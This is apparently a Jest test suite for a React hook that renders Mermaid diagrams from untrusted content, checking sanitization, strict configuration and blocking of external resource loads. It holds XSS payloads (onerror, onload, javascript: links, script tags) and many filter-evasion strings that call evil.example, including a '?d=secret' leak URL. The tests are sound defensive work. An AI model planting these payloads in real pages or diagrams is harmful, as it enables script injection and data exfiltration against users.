/**
 * useMermaidRenderer turns the diagram containers created by the Markdown
 * renderer into diagrams. Diagram source comes from content (model output,
 * pages, user messages), so everything the hook writes into the page has to
 * treat it as text or sanitized markup, and look-alike containers that come
 * from the content itself must be left alone.
 */
import { renderHook, waitFor } from '@testing-library/react';

jest.mock('mermaid', () => ({
  __esModule: true,
  default: { initialize: jest.fn(), render: jest.fn() }
}));

jest.mock('svg-pan-zoom', () =>
  jest.fn(() => ({
    destroy: jest.fn(),
    zoomIn: jest.fn(),
    zoomOut: jest.fn(),
    reset: jest.fn(),
    fit: jest.fn(),
    center: jest.fn()
  }))
);

import mermaid from 'mermaid';
import { useMermaidRenderer } from '../../../client/src/hooks/useMermaidRenderer';
import { renderMarkdown } from '../../../client/src/config/marked.config';
import {
  MERMAID_CONTAINER_TOKEN_ATTRIBUTE,
  isTrustedMermaidContainer,
  mermaidExternalResourceReason,
  sanitizeMermaidSvg
} from '../../../client/src/utils/mermaidSecurity';

const t = (key, fallback) => fallback;

/** A global flag that the inline handlers in the test markup would set. */
const SENTINEL = '__mermaidRendererSentinel';
const SET_SENTINEL = `window.${SENTINEL} = true`;

const fence = source => `\`\`\`mermaid\n${source}\n\`\`\``;

/** Renders Markdown the way the app does and puts the result into the page. */
const mountMarkdown = (markdown, options) => {
  const host = document.createElement('div');
  host.innerHTML = renderMarkdown(markdown, options);
  document.body.appendChild(host);
  return host;
};

const startHook = () => renderHook(() => useMermaidRenderer({ t }));

/** Dispatches the events the test markup has inline handlers for. */
const fireInlineHandlers = root => {
  root.querySelectorAll('*').forEach(element => {
    element.dispatchEvent(new Event('error'));
    element.dispatchEvent(new Event('load'));
  });
};

const simpleSvg = (id, labelHtml = 'Start') =>
  `<svg id="${id}" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">` +
  `<style>#${id}{font-family:sans-serif;}</style>` +
  '<g class="node"><rect width="80" height="30"></rect>' +
  '<foreignObject width="80" height="30">' +
  '<div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell;">' +
  `<span class="nodeLabel"><p>${labelHtml}</p></span>` +
  '</div></foreignObject></g></svg>';

beforeEach(() => {
  mermaid.initialize.mockClear();
  mermaid.render.mockReset();
  delete window[SENTINEL];
});

afterEach(() => {
  document.body.innerHTML = '';
  delete window[SENTINEL];
  jest.restoreAllMocks();
});

describe('useMermaidRenderer', () => {
  test('configures Mermaid with the strict security level', async () => {
    mountMarkdown(fence('flowchart TD\n  A[Config] --> B[Check]'));
    mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id) }));

    startHook();

    await waitFor(() => expect(mermaid.initialize).toHaveBeenCalled());
    expect(mermaid.initialize).toHaveBeenCalledWith(
      expect.objectContaining({ securityLevel: 'strict' })
    );
    // Label HTML loses everything that loads or styles, and a diagram's own
    // %%{init}%% or front matter can neither loosen that nor write CSS.
    const config = mermaid.initialize.mock.calls[0][0];
    expect(config.dompurifyConfig.FORBID_TAGS).toEqual(
      expect.arrayContaining(['img', 'image', 'style', 'video', 'iframe'])
    );
    expect(config.dompurifyConfig.FORBID_ATTR).toEqual(
      expect.arrayContaining(['style', 'src', 'srcset', 'background', 'class'])
    );
    expect(config.secure).toEqual(
      expect.arrayContaining(['dompurifyConfig', 'themeCSS', 'fontFamily', 'securityLevel'])
    );
  });

  test('renders diagram source and error message as text in the error state', async () => {
    jest.spyOn(console, 'error').mockImplementation(() => {});

    // Control: inline handlers do run in this environment, so the sentinel
    // check below is meaningful.
    const control = document.createElement('div');
    control.innerHTML = `<img src="x" onerror="${SET_SENTINEL}">`;
    control.firstChild.dispatchEvent(new Event('error'));
    expect(window[SENTINEL]).toBe(true);
    delete window[SENTINEL];

    const source =
      'flowchart TD\n' +
      '  A[<b>marker</b>] --> B[Next]\n' +
      `  B --> C[<a onclick="${SET_SENTINEL}">x</a>]`;
    const host = mountMarkdown(fence(source));
    mermaid.render.mockRejectedValue(new Error('Parse error near <b>marker</b>'));

    startHook();

    const container = host.querySelector('.mermaid-diagram-container');
    await waitFor(() => expect(container.querySelector('pre code')).not.toBeNull());

    expect(container.querySelector('pre code').textContent).toBe(source);
    expect(container.textContent).toContain('Parse error near <b>marker</b>');
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('a')).toBeNull();

    fireInlineHandlers(container);
    expect(window[SENTINEL]).toBeUndefined();
  });

  test('leaves diagram containers alone that the Markdown renderer did not create', async () => {
    const trustedSource = 'flowchart TD\n  A[Trusted] --> B[Diagram]';
    const lookAlikeCode = encodeURIComponent('flowchart TD\n  X[Look] --> Y[Alike]');
    // Raw HTML in trusted content (an admin's page) keeps class and data-*
    // attributes through the Markdown sanitizer, so these reach the page as
    // written. (Model output loses class and id on anything iHub did not create.)
    const host = mountMarkdown(
      [
        fence(trustedSource),
        '',
        `<div class="mermaid-diagram-container" id="without-token" data-code="${lookAlikeCode}">untouched one</div>`,
        '',
        `<div class="mermaid-diagram-container" id="wrong-token" ${MERMAID_CONTAINER_TOKEN_ATTRIBUTE}="0123456789abcdef0123456789abcdef" data-code="${lookAlikeCode}">untouched two<button class="mermaid-fullscreen" data-svg="${encodeURIComponent('<p id="from-attribute">attribute</p>')}">Full</button></div>`
      ].join('\n'),
      { trusted: true }
    );
    mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id) }));

    const [trusted] = host.querySelectorAll('.mermaid-diagram-container');
    const withoutToken = host.querySelector('#without-token');
    const wrongToken = host.querySelector('#wrong-token');
    expect(isTrustedMermaidContainer(trusted)).toBe(true);
    expect(isTrustedMermaidContainer(withoutToken)).toBe(false);
    expect(isTrustedMermaidContainer(wrongToken)).toBe(false);
    const wrongTokenMarkup = wrongToken.innerHTML;

    startHook();

    await waitFor(() => expect(trusted.querySelector('.mermaid-svg-container svg')).not.toBeNull());

    expect(mermaid.render).toHaveBeenCalledTimes(1);
    expect(mermaid.render.mock.calls[0][1]).toBe(trustedSource);
    expect(withoutToken.dataset.processed).toBeUndefined();
    expect(withoutToken.textContent).toBe('untouched one');
    expect(wrongToken.dataset.processed).toBeUndefined();
    expect(wrongToken.innerHTML).toBe(wrongTokenMarkup);

    // Toolbar look-alikes outside a container the renderer created do nothing.
    wrongToken.querySelector('.mermaid-fullscreen').click();
    expect(document.querySelector('.mermaid-fullscreen-modal')).toBeNull();
    expect(document.getElementById('from-attribute')).toBeNull();
  });

  test('sanitizes the SVG returned by Mermaid and keeps HTML node labels', async () => {
    const host = mountMarkdown(fence('flowchart TD\n  A[Start] --> B[Sanitized]'));
    mermaid.render.mockImplementation(async id => ({
      svg:
        `<svg id="${id}" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50" onload="${SET_SENTINEL}">` +
        `<style>#${id}{font-family:sans-serif;}</style>` +
        `<script>${SET_SENTINEL}</script>` +
        '<g class="node" id="flowchart-A-0"><rect width="80" height="30"></rect>' +
        '<foreignObject width="80" height="30">' +
        '<div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell;">' +
        `<span class="nodeLabel"><p>Start <b>marker</b><img src="x" onerror="${SET_SENTINEL}"></p></span>` +
        '</div></foreignObject></g>' +
        `<a href="javascript:${SET_SENTINEL}"><text x="0" y="45">link</text></a>` +
        '</svg>'
    }));

    startHook();

    const container = host.querySelector('.mermaid-diagram-container');
    await waitFor(() =>
      expect(container.querySelector('.mermaid-svg-container svg')).not.toBeNull()
    );

    const svg = container.querySelector('.mermaid-svg-container svg');
    expect(svg.id).toBe(`${container.id}-svg`);
    expect(svg.hasAttribute('onload')).toBe(false);
    expect(container.querySelector('script')).toBeNull();
    expect(svg.querySelector('style')).not.toBeNull();

    const label = svg.querySelector('foreignObject span.nodeLabel p');
    expect(label).not.toBeNull();
    expect(label.textContent).toBe('Start marker');
    expect(label.querySelector('b').textContent).toBe('marker');
    expect(label.querySelector('img').hasAttribute('onerror')).toBe(false);

    const link = svg.querySelector('a');
    expect(link.getAttribute('href') ?? '').not.toMatch(/^javascript:/i);

    fireInlineHandlers(container);
    expect(window[SENTINEL]).toBeUndefined();
  });

  test('opens the fullscreen view from the rendered diagram, not from button attributes', async () => {
    const host = mountMarkdown(fence('flowchart TD\n  A[Full] --> B[Screen]'));
    mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id, 'Fullscreen label') }));

    startHook();

    const container = host.querySelector('.mermaid-diagram-container');
    await waitFor(() =>
      expect(container.querySelector('.mermaid-svg-container svg')).not.toBeNull()
    );

    const button = container.querySelector('.mermaid-fullscreen');
    expect(button.hasAttribute('data-svg')).toBe(false);
    button.setAttribute(
      'data-svg',
      encodeURIComponent(
        `<p id="from-attribute">attribute</p><img src="x" onerror="${SET_SENTINEL}">`
      )
    );

    button.click();

    const modal = document.querySelector('.mermaid-fullscreen-modal');
    expect(modal).not.toBeNull();
    expect(modal.querySelector('.diagram-content span.nodeLabel').textContent).toBe(
      'Fullscreen label'
    );
    expect(document.getElementById('from-attribute')).toBeNull();
    expect(modal.querySelector('img')).toBeNull();
    expect(window[SENTINEL]).toBeUndefined();

    modal.querySelector('.close-fullscreen').click();
    expect(document.querySelector('.mermaid-fullscreen-modal')).toBeNull();
  });

  test('does not draw a diagram that would load from another site, and shows its source', async () => {
    jest.spyOn(console, 'error').mockImplementation(() => {});
    const source =
      'flowchart TD\n' +
      '  A[Start] --> B[Next]\n' +
      '  B@{ shape: image, img: "https://evil.example/x.png?d=secret" }';
    const host = mountMarkdown(fence(source));
    mermaid.render.mockImplementation(async id => ({ svg: simpleSvg(id) }));

    startHook();

    const container = host.querySelector('.mermaid-diagram-container');
    await waitFor(() => expect(container.querySelector('pre code')).not.toBeNull());
    expect(mermaid.render).not.toHaveBeenCalled();
    expect(container.querySelector('pre code').textContent).toBe(source);
    expect(container.textContent).toContain('Diagram not drawn.');
    expect(container.textContent).not.toContain('Syntax Error');
  });
});

describe('mermaidExternalResourceReason', () => {
  const blocked = {
    'image shape on another host': 'flowchart TD\n  A@{ img: "https://evil.example/a.png" }',
    'image shape, unquoted and multi-line':
      'flowchart TD\n  A@{\n    shape: image\n    img: https://evil.example/a.png\n  }',
    'image shape, protocol-relative': 'flowchart TD\n  A@{ img: "//evil.example/a.png" }',
    'image shape, quoted key': 'flowchart TD\n  A@{ "img": "https://evil.example/a.png" }',
    'image shape behind a YAML escape': 'flowchart TD\n  A@{ "\\x69mg": "/a.png" }',
    'image shape behind a YAML alias':
      'flowchart TD\n  A@{ label: &k img, *k : "https://evil.example/a.png" }',
    'img tag in a label': 'flowchart TD\n  A["<img src=\'https://evil.example/a\'>"] --> B',
    'img tag as Mermaid entities':
      'flowchart TD\n  A["#60;img src=https://evil.example/a#62;"] --> B',
    'img tag as HTML entities': 'flowchart TD\n  A["&lt;img src=https://evil.example/a&gt;"] --> B',
    'style tag in a label': 'flowchart TD\n  A["<style>*{}</style>"] --> B',
    'table background in a label':
      'flowchart TD\n  A["<table background=https://evil.example/t>"] --> B',
    'classDef with url()':
      'flowchart TD\n  A:::x --> B\n  classDef x background-image:url(https://evil.example/b)',
    'style with escaped url()':
      'flowchart TD\n  A --> B\n  style A background:\\75 rl(https://evil.example/b)',
    'themeCSS @import in a directive':
      '%%{init: {"themeCSS": "@import \\"https://evil.example/s.css\\";"}}%%\nflowchart TD\n  A --> B',
    'url() behind a JSON escape':
      '%%{init: {"fontFamily": "x; background:\\u0075rl(https://evil.example/f)"}}%%\nflowchart TD\n  A --> B',
    'front matter themeCSS':
      '---\nconfig:\n  themeCSS: ".node rect { fill: url(https://evil.example/p.svg#g) }"\n---\nflowchart TD\n  A --> B',
    'image-set()': 'flowchart TD\n  A --> B\n  style A background-image:image-set("x.png" 1x)'
  };

  test.each(Object.entries(blocked))('%s is refused', (_, code) => {
    expect(mermaidExternalResourceReason(code)).not.toBe('');
  });

  const allowed = {
    'a plain flowchart': 'flowchart TD\n  A[Start] --> B{Ok?}\n  B -->|yes| C[Done]',
    'styles without loads':
      'flowchart TD\n  A:::hot --> B\n  classDef hot fill:#f96,stroke:#333,stroke-width:4px\n  style B fill:#bbf',
    'theme variables':
      "%%{init: {'theme':'base','themeVariables':{'primaryColor':'#ff0000'}}}%%\nflowchart TD\n  A --> B",
    'a node named url with a round label':
      'flowchart LR\n  url(Enter address) --> fetch[Fetch page]',
    'line breaks and bold in labels': 'flowchart TD\n  A["first<br/>second <b>bold</b>"] --> B',
    'shape metadata without an image': 'flowchart TD\n  A@{ shape: rounded, label: "R and D" }',
    'an image shape on this server': 'flowchart TD\n  A@{ img: "/uploads/logo.png", shape: image }',
    'an inline data image': 'flowchart TD\n  A@{ img: "data:image/png;base64,iVBORw0KGgo=" }',
    'a sequence diagram': 'sequenceDiagram\n  Alice->>Bob: Hello\n  Bob-->>Alice: Hi',
    'math in a label': 'flowchart TD\n  A["$$x^2 + \\frac{1}{2}$$"] --> B'
  };

  test.each(Object.entries(allowed))('%s is drawn', (_, code) => {
    expect(mermaidExternalResourceReason(code)).toBe('');
  });
});

describe('sanitizeMermaidSvg', () => {
  test('removes references to other hosts and keeps in-document ones', () => {
    const svg =
      '<svg id="d" xmlns="http://www.w3.org/2000/svg">' +
      '<style>#d .node rect{fill:#fff}</style>' +
      '<style>#d .x{background:url(https://evil.example/b)}</style>' +
      '<defs><marker id="arrow"></marker></defs>' +
      '<path marker-end="url(#arrow)" style="stroke:#333"></path>' +
      '<rect style="fill:url(https://evil.example/p.svg#g)"></rect>' +
      '<image href="https://evil.example/i.png"></image>' +
      '<image href="/uploads/local.png"></image>' +
      '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src="https://evil.example/l.png" alt="L"></div></foreignObject>' +
      '</svg>';
    const host = document.createElement('div');
    host.innerHTML = sanitizeMermaidSvg(svg);

    expect(host.innerHTML).not.toContain('evil.example/b');
    expect(host.innerHTML).not.toContain('evil.example/p.svg');
    expect(host.innerHTML).not.toContain('evil.example/i.png');
    expect(host.querySelector('foreignObject img, foreignobject img')).toBeNull();
    expect(host.querySelectorAll('style')).toHaveLength(1);
    expect(host.querySelector('path').getAttribute('marker-end')).toBe('url(#arrow)');
    expect(host.querySelector('path').getAttribute('style')).toBe('stroke:#333');
    expect(host.querySelector('rect').hasAttribute('style')).toBe(false);
    const images = host.querySelectorAll('image');
    const hrefs = Array.from(images, image => image.getAttribute('href'));
    expect(hrefs).toContain('/uploads/local.png');
    expect(hrefs.filter(Boolean)).toEqual(['/uploads/local.png']);
  });
});
